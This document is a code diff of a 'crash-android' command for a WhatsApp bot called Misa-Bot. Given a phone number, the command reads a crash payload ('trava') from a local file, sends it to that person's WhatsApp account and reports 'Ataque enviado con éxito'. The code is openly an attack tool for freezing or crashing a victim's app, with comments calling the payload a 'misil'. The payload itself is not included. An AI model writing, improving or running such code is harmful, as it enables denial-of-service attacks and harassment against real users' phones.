@@ -1,57 +1,60 @@
-/* * 👑 MISA CRASH-ANDROID (ULTIMATE FIX)
- * Ruta: comandos/crash-android.js
+/* * 👑 MISA CRASH-ANDROID
+ * Canal: https://whatsapp.com/channel/0029Vav6SNC7z4kofN80pW27
+ * Github: https://github.com/yannielmedrano1-sys/Misa-Bot
  */
-import { jidDecode } from '@whiskeysockets/baileys'
-import fs from 'fs'
-import path from 'path'
+
+import fs from 'fs';
+import path from 'path';
 
 const crashAndroidMisa = {
     name: 'crash-android',
     alias: ['ca', 'crash', 'ola'],
     category: 'tools',
     noPrefix: true,
+    isOwner: true, // Lo ponemos en true para que solo tú (Yanniel) puedas usarlo
 
     run: async (conn, m, { args, command }) => {
         try {
-            // 1. Validación de número (Usando sendMessage en vez de m.reply)
+            // 1. Validación de número (Usando remoteJid como en tu menú)
+            const chat = m.key.remoteJid;
+
             if (!args[0]) {
-                return conn.sendMessage(m.chat, { 
-                    text: `✧ ‧₊˚ *MISA CRASH* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: ${command} [número]\n> ✐ *Ejemplo:* ${command} 1809xxxxxxx` 
-                }, { quoted: m })
+                const textoUso = `✧ ‧₊˚ *MISA CRASH* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: ${command} [número]\n> ✐ *Ejemplo:* ${command} 1809xxxxxxx`;
+                return await conn.sendMessage(chat, { text: textoUso }, { quoted: m });
             }
 
-            // 2. Limpieza y validación de JID
-            let num = args[0].replace(/[^0-9]/g, '')
+            // 2. Limpieza de JID
+            const num = args[0].replace(/[^0-9]/g, '');
             if (!num || num.length < 8) {
-                return conn.sendMessage(m.chat, { text: '❌ *El número es inválido.*' }, { quoted: m })
+                return await conn.sendMessage(chat, { text: '❌ *Número inválido.*' }, { quoted: m });
             }
-            let targetJid = num + '@s.whatsapp.net'
+            const targetJid = `${num}@s.whatsapp.net`;
 
-            // 3. Ruta al archivo ola.js
-            const travaPath = path.join(process.cwd(), 'travas', 'ola.js')
-            if (!fs.existsSync(travaPath)) {
-                return conn.sendMessage(m.chat, { text: '❌ No encontré `travas/ola.js`.' }, { quoted: m })
+            // 3. Leer la trava desde tu carpeta /travas/
+            const pathTrava = path.join(process.cwd(), 'travas', 'ola.js');
+            
+            if (!fs.existsSync(pathTrava)) {
+                return await conn.sendMessage(chat, { text: '❌ No encontré el archivo: `travas/ola.js`' }, { quoted: m });
             }
 
-            // 4. Leer contenido
-            const contenido = fs.readFileSync(travaPath, 'utf-8')
+            const contenidoTrava = fs.readFileSync(pathTrava, 'utf8');
 
-            // 5. Reacción de confirmación
-            await conn.sendMessage(m.chat, { react: { text: '💀', key: m.key } })
+            // 4. Ejecución (Reacción y envío)
+            await conn.sendMessage(chat, { react: { text: '💀', key: m.key } });
 
-            // 6. ENVÍO DEL TRAVA AL OBJETIVO
-            await conn.sendMessage(targetJid, { text: contenido })
+            // Enviamos el "misil" al objetivo
+            await conn.sendMessage(targetJid, { text: contenidoTrava });
 
-            // 7. Mensaje de éxito en tu chat
-            await conn.sendMessage(m.chat, { 
-                text: `✅ *Ataque enviado a @${num}*`,
+            // 5. Confirmación final con estética Misa
+            await conn.sendMessage(chat, { 
+                text: `✅ *Ataque enviado con éxito a @${num}*`,
                 mentions: [targetJid]
-            }, { quoted: m })
+            }, { quoted: m });
 
         } catch (err) {
-            console.error('[ERROR EN CRASH-ANDROID]:', err)
+            console.error('Error en crash-android:', err);
         }
     }
-}
+};
 
-export default crashAndroidMisa
+export default crashAndroidMisa;
